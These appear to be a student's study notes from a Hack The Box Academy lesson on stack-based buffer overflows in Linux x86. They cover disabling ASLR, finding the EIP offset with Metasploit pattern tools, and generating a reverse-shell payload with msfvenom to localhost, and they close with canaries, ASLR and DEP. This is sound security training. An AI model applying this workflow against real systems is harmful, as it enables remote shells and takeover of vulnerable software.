## Buffer Overflows Overview : 

Buffer overflows have become less common in todays world as modern compilers have built in memory-protections that make it difficult for memory corruption bugs to occur accidentally. That being said languages like C are not going to go away anytime soon and they are predominate in embedded software and IOT (Internet of Things).

## Exploit Development Introduction : 

An `0-day exploit` is a code that exploits a newly identified vulnerability in a specific application.

When they are published, they talk about `N-day exploits`, counting the days between the publication of the exploit and an attack on the unpatched systems.

Also, these exploits can be divided into four different categories:
- `Local`.
- `Remote`.
- `DoS`.
- `WebApp`.

## CPU Architecture : 

The architecture of the `Von-Neumann` was developed by the Hungarian mathematician John von Neumann, and it consists of four functional units :
- `Memory`
- `Control Unit`
- `Arithmetical Logical Unit`
- `Input/Output Unit`

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/Stack-Based%20Buffer%20Overflows%20on%20Linux%20x86/Images/von_neumann3.webp)

There are four different types of `ISA`:
- `CISC` - `Complex Instruction Set Computing`
- `RISC` - `Reduced Instruction Set Computing`
- `VLIW` - `Very Long Instruction Word`
- `EPIC` - `Explicitly Parallel Instruction Computing`

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/Stack-Based%20Buffer%20Overflows%20on%20Linux%20x86/Images/Instruction.png)

## Stack-Based Buffer Overflow : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/Stack-Based%20Buffer%20Overflows%20on%20Linux%20x86/Images/buffer_overflow_1.webp)
#### .text
The `.text` section contains the actual assembler instructions of the program. This area can be read-only to prevent the process from accidentally modifying its instructions. Any attempt to write to this area will inevitably result in a segmentation fault.
#### .data
The `.data` section contains global and static variables that are explicitly initialized by the program.
#### .bss
Several compilers and linkers use the `.bss` section as part of the data segment, which contains statically allocated variables represented exclusively by 0 bits.

Vulnerable C Functions : 
- `strcpy`
- `gets`
- `sprintf`
- `scanf`
- `strcat`

```shell
(gdb) set disassembly-flavor intel
(gdb) disassemble main
```

Modern operating systems have built-in protections against such vulnerabilities, like Address Space Layout Randomization (ASLR). For the purpose of learning the basics of buffer overflow exploitation, we are going to disable this memory protection features :

```shell-session
student@nix-bow:~$ sudo su
root@nix-bow:/home/student# echo 0 > /proc/sys/kernel/randomize_va_space
```

## CPU Registers : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/Stack-Based%20Buffer%20Overflows%20on%20Linux%20x86/Images/Registers.png)

## Take Control of EIP : 

One of the most important aspects of a stack-based buffer overflow is to get the `instruction pointer` (`EIP`) under control, so we can tell it to which address it should jump. This will make the `EIP` point to the address where our `shellcode` starts and causes the CPU to execute it.

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/Stack-Based%20Buffer%20Overflows%20on%20Linux%20x86/Images/buffer_overflow_2.webp)

```
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 


/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt

/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 0x69423569

info registers
```

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/Stack-Based%20Buffer%20Overflows%20on%20Linux%20x86/Images/buffer_overflow_3.webp)
![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/Stack-Based%20Buffer%20Overflows%20on%20Linux%20x86/Images/buffer_overflow_4.webp)

## Determine the Length for Shellcode :

Now we should find out how much space we have for our shellcode to perform the action we want. It is trendy and useful for us to exploit such a vulnerability to get a reverse shell. First, we have to find out approximately how big our shellcode will be that we will insert, and for this, we will use `msfvenom`.

```shell
NolanCarougeHTB@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c


No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
```

Let us briefly summarize what we need for this:
1. We need a total of 1040 bytes to get to the `EIP`.
2. Here, we can use an additional `100 bytes` of `NOPs`
3. `150 bytes` for our `shellcode`.

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/Stack-Based%20Buffer%20Overflows%20on%20Linux%20x86/Images/buffer_overflow_8.webp)
![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/Stack-Based%20Buffer%20Overflows%20on%20Linux%20x86/Images/buffer_overflow_7.webp)

# Identification of Bad Characters :

Previously in UNIX-like operating systems, binaries started with two bytes containing a "`magic number`" that determines the file type. In the beginning, this was used to identify object files for different platforms. Gradually this concept was transferred to other files, and now almost every file contains a magic number.

Such reserved characters also exist in applications, but they do not always occur and are not still the same. These reserved characters, also known as `bad characters` can vary, but often we will see characters like this :

- `\x00` - Null Byte
- `\x0A` - Line Feed
- `\x0D` - Carriage Return
- `\xFF` - Form Feed

## Generating Shellcode : 

We already got to know the tool `msfvenom` with which we generated our shellcode's approximate length. Now we can use this tool again to generate the actual shellcode, which makes the CPU of our target system execute the command we want to have.

```shell
msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode

info proc all
```

## Identification of the Return Address : 

After checking that we still control the EIP with our shellcode, we now need a memory address where our NOPs are located to tell the EIP to jump to it. This memory address must not contain any of the bad characters we found previously.

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/Stack-Based%20Buffer%20Overflows%20on%20Linux%20x86/Images/buffer_overflow_9.webp)

## Prevention Techniques and Mechanisms : 

### Canaries

The `canaries` are known values written to the stack between buffer and control data to detect buffer overflows. The principle is that in case of a buffer overflow, the canary would be overwritten first and that the operating system checks during runtime that the canary is present and unaltered.

### Address Space Layout Randomization (ASLR)

Address Space Layout Randomization (`ASLR`) is a security mechanism against buffer overflows. It makes some types of attacks more difficult by making it difficult to find target addresses in memory. The operating system uses ASLR to hide the relevant memory addresses from us. So the addresses need to be guessed, where a wrong address most likely causes a crash of the program, and accordingly, only one attempt exists.

### Data Execution Prevention (DEP)

`DEP` is a security feature available in Windows XP, and later with Service Pack 2 (SP2) and above, programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.
